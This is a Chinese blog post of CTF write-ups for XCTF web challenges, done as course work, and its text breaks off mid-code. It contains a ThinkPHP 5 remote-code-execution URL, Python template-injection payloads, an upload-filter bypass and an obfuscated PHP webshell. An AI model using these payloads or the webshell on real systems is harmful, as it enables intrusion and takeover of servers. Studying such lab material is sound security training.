<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>攻防世界Web题目WP（一） | Capcomin's Space</title><meta name="keywords" content="CTF,Web,课程作业,网络安全,攻防世界"><meta name="author" content="Capcomin"><meta name="copyright" content="Capcomin"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本文是《网络安全课程设计》的一项任务   robots题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。 robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或">
<meta property="og:type" content="article">
<meta property="og:title" content="攻防世界Web题目WP（一）">
<meta property="og:url" content="https://zxy.link/posts/7eaecac2/index.html">
<meta property="og:site_name" content="Capcomin&#39;s Space">
<meta property="og:description" content="本文是《网络安全课程设计》的一项任务   robots题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。 robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://zxy.link/img/BEC1AFA5887CA3CF9B67BAAD53F20251.png">
<meta property="article:published_time" content="2021-11-15T10:00:00.000Z">
<meta property="article:modified_time" content="2022-01-23T13:00:14.902Z">
<meta property="article:author" content="Capcomin">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="课程作业">
<meta property="article:tag" content="网络安全">
<meta property="article:tag" content="攻防世界">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://zxy.link/img/BEC1AFA5887CA3CF9B67BAAD53F20251.png"><link rel="shortcut icon" href="/img/soundcloud.png"><link rel="canonical" href="https://zxy.link/posts/7eaecac2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '攻防世界Web题目WP（一）',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-01-23 21:00:14'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Capcomin's Space" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://avatars.githubusercontent.com/u/75996100?v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/cybersec.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Capcomin's Space</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">攻防世界Web题目WP（一）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-11-15T10:00:00.000Z" title="发表于 2021-11-15 18:00:00">2021-11-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-23T13:00:14.902Z" title="更新于 2022-01-23 21:00:14">2022-01-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>23分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="攻防世界Web题目WP（一）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/7eaecac2/#post-comment"><span class="gitalk-comment-count"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><div class="note info flat"><p>本文是《网络安全课程设计》的一项任务</p>
</div>

<h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p><strong>题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。</strong></p>
<p>robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。</p>
<p>于是应该读取robots.txt里的内容。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/df9f5f5e75986b677ce32396cffd8cc9.png"></p>
<p>直接访问<a target="_blank" rel="noopener" href="http://111.200.241.244:58484/f1ag_1s_h3re.php%E5%BE%97%E5%88%B0flag%E3%80%82">http://111.200.241.244:58484/f1ag_1s_h3re.php得到flag。</a></p>
<h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/b2bd1f216d60ddfe07f4ace3182afe2c.png"></p>
<p>由题目名称可得知本题与robots协议有关，于是检查该站点有没有robots.txt文件：Disallow:<br>/fl0g.php表示网站禁止蜘蛛访问本目录，于是我们尝试访问<a target="_blank" rel="noopener" href="http://111.200.241.244:63486/fl0g.php">http://111.200.241.244:63486/fl0g.php</a>，得到flag。<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/0ccb5d59c2010734adb4c98539b534dc.png"></p>
<h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><p>由题意得本题应该与ThinkPHP V5远程代码执行漏洞相关。在Github上搜索相关内容：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/4fd2ab7182703b25198994e81a425125.png"></p>
<p>在网页中随意打开一个无效网址，得到报错提示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a9cca3ac9c5022816ae10322324a7b66.png">由此我们可以得到版本号为ThinkPHP V5.0.20。在相关漏洞中检索，首先尝试<code>http://111.200.241.244:60671/?s=index/\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code>，可以发现远程代码执行成功：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/326a10e0e05a53ff0c372081a203431c.png">于是将id换为ls以查找目录，不断进入上层目录发现flag文件：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/c80c7f3d4d4d0ac99695d0d2ad79e1d0.png"></p>
<p>于是直接利用cat命令打开/flag目录，得到flag。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/8f829e80fed6ebefee5ca0e3339f5ef8.png"></p>
<h2 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h2><p>由题意可得本题利用了Python-模板注入漏洞。在当前URL后面添加<code>&#123;&#123;[].class&#125;&#125;</code>可以得到如下结果，说明代码注入成功，网站已经执行了我们的代码。<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/e3e0d499e72c09732cf4a4134a10d736.png"></p>
<p>于是便可以利用python的os模块的<code>listdir()</code>函数来读取当前目录。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].listdir(<span class="string">&#x27;.&#x27;</span>)  <span class="comment">#读取当前目录</span></span><br></pre></td></tr></table></figure>

<p>注入代码后得到：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/469510da576d41cbe50d3e331c6a38fe.png"></p>
<p>发现当前目录中有fl4g文件，于是尝试打开该文件。使用Python中file模块的<code>read()</code>函数读取文件，并得到flag值：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;fl4g&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/fa75c00e91a77618bff21a57442ebc8f.png"></p>
<div class="note warning flat"><p>下文的“难度”指攻防世界的题目星级，最高为10星</p>
</div>

<h2 id="ics-07-（难度：5-10）"><a href="#ics-07-（难度：5-10）" class="headerlink" title="ics-07 （难度：5/10）"></a>ics-07 （难度：5/10）</h2><p>进入主页后发现左侧菜单栏和右侧一张图片，但菜单栏只有“项目管理”按钮有作用：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/8e6eb9efc070cfff3e42cc8d54fb82b7.png"></p>
<p>进入后有一个登录界面和源代码查看按钮：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/311ea86d8680347f7c15d4b5ff668f69.png"></p>
<p>查看源代码进行代码审计。</p>
<p>首先仔细阅读第一段代码，如果page不为空且不等于<code>index.php</code>，那么就会执行<code>include(&#39;flag.php&#39;);</code>否则会重定向到<code>flag.php</code>文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page])) &#123;</span><br><span class="line">      show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">      <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page]) &amp;&amp; <span class="variable">$_GET</span>[page] != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      header(<span class="string">&#x27;Location: ?page=flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二段代码用来进行用户身份鉴别，判断session是不是admin，并获取值来匹配<code>ph(p[3457]?\|t\|tml)</code>，如果匹配成功（即<code>php3457</code>,<code>pht</code>,<code>phtml</code>），输出”<code>Bad file extension</code>“，并退出；否则写入文件。实际上这段代码是对php文件进行过滤，检验成功后文件上传到<code>/uploaded/backup/</code>的目录。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &#123;</span><br><span class="line">       <span class="variable">$con </span>= <span class="variable">$_POST</span>[<span class="string">&#x27;con&#x27;</span>];</span><br><span class="line">       <span class="variable">$file </span>= <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       <span class="variable">$filename </span>= <span class="string">&quot;backup/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;Bad file extension&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            chdir(<span class="string">&#x27;uploaded&#x27;</span>);</span><br><span class="line">           <span class="variable">$f </span>= fopen(<span class="variable">$filename</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">           fwrite(<span class="variable">$f</span>, <span class="variable">$con</span>);</span><br><span class="line">           fclose(<span class="variable">$f</span>);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第三段代码是对<code>get</code>参数<code>id</code>进行校验，如果id的浮点数不是1，且最后一位是9那么实行查询语句，如果查询正确，会得到一个admin的session。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id]) &amp;&amp; floatval(<span class="variable">$_GET</span>[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; substr(<span class="variable">$_GET</span>[id], -<span class="number">1</span>) === <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$id </span>= mysql_real_escape_string(<span class="variable">$_GET</span>[id]);</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;select * from cetc007.user where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result </span>= mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result </span>= mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$result </span>= <span class="literal">False</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!<span class="variable">$result</span>)<span class="keyword">die</span>(<span class="string">&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span>.<span class="variable">$result</span>-&gt;id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$result</span>-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span>;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里我们直接构造满足所有要求的payload：<code>?id=1a9&amp;page=flag.php</code>，成功绕过。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/raoguo.png"></p>
<p>下面我们开始尝试文件上传。由第二段可以看到，我们只能用POST的方式上传文件，参数<code>con</code>是文件内容，参数<code>file</code>是文件名。我们使用中国蚁剑生成密码为zzz的木马：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$exRN</span>=create_function(str_rot13(<span class="string">&#x27;$&#x27;</span>).chr(<span class="number">0x307</span>-<span class="number">0x294</span>).chr(<span class="number">0155546</span>/<span class="number">0772</span>).str_rot13(<span class="string">&#x27;z&#x27;</span>).chr(<span class="number">01154</span>-<span class="number">01007</span>),chr(<span class="number">474</span>-<span class="number">373</span>).str_rot13(<span class="string">&#x27;i&#x27;</span>).base64_decode(<span class="string">&#x27;YQ==&#x27;</span>).base64_decode(<span class="string">&#x27;bA==&#x27;</span>).str_rot13(<span class="string">&#x27;(&#x27;</span>).chr(<span class="number">891</span>-<span class="number">855</span>).str_rot13(<span class="string">&#x27;f&#x27;</span>).chr(<span class="number">38628</span>/<span class="number">348</span>).str_rot13(<span class="string">&#x27;z&#x27;</span>).chr(<span class="number">54540</span>/<span class="number">540</span>).str_rot13(<span class="string">&#x27;)&#x27;</span>).str_rot13(<span class="string">&#x27;;&#x27;</span>));<span class="variable">$exRN</span>(base64_decode(<span class="string">&#x27;ODA5N&#x27;</span>.<span class="string">&#x27;jM5O0&#x27;</span>.<span class="string">&#x27;BldkF&#x27;</span>.<span class="string">&#x27;sKCRf&#x27;</span>.<span class="string">&#x27;&#x27;</span>.chr(<span class="number">0x325</span>-<span class="number">0x2d0</span>).chr(<span class="number">01116</span>-<span class="number">01011</span>).chr(<span class="number">01371</span>-<span class="number">01300</span>).base64_decode(<span class="string">&#x27;VA==&#x27;</span>).str_rot13(<span class="string">&#x27;I&#x27;</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;&#x27;</span>.chr(<span class="number">792</span>-<span class="number">722</span>).chr(<span class="number">0x650c</span>/<span class="number">0xdf</span>).base64_decode(<span class="string">&#x27;Ng==&#x27;</span>).chr(<span class="number">0x14b</span>-<span class="number">0xe6</span>).chr(<span class="number">0x2c5</span>-<span class="number">0x257</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;pdKTs&#x27;</span>.<span class="string">&#x27;yNDI4&#x27;</span>.<span class="string">&#x27;OTE3O&#x27;</span>.<span class="string">&#x27;w==&#x27;</span>.<span class="string">&#x27;&#x27;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>由第二段代码我们可以发现正则判断.之后的字符，于是我们加个/.即可解决。所以我们post的payload是：</p>
<p><code>file=pa.php/.&amp;con=\&lt;?php \$exRN……;?\&gt;(省略处见前述木马)</code></p>
<p>成功连接中国蚁剑</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/c2501ab2a9daeef01e31dd752a762928.png"></p>
<p>打开/var/www/html/flag.php，得到flag。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/e8d57c85d1a0679662431fc3f3f84ebe.png"></p>
<h2 id="wtf-sh-150-（难度：7-10）"><a href="#wtf-sh-150-（难度：7-10）" class="headerlink" title="wtf.sh-150 （难度：7/10）"></a>wtf.sh-150 （难度：7/10）</h2><p>进入网站后随便打开一篇文章，注意观察URL:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/f22d356b05304e1feeed8ac13419de94.png"></p>
<p>注意到可能有路径穿越漏洞，于是尝试构造URL为<a target="_blank" rel="noopener" href="http://111.200.241.244:55069/post.wtf?post=..%E5%BE%97%E5%88%B0%E7%BD%91%E7%AB%99%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%9A">http://111.200.241.244:55069/post.wtf?post=..得到网站源代码：</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/b60f653a2b7edfaae6474c9946368d39.png"></p>
<p>直接Ctrl+F搜索“flag”关键词：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/981b4430ec7ddfa32cc3893aed8b1e90.png"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/css/std.css&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">$ if contains &#x27;user&#x27; 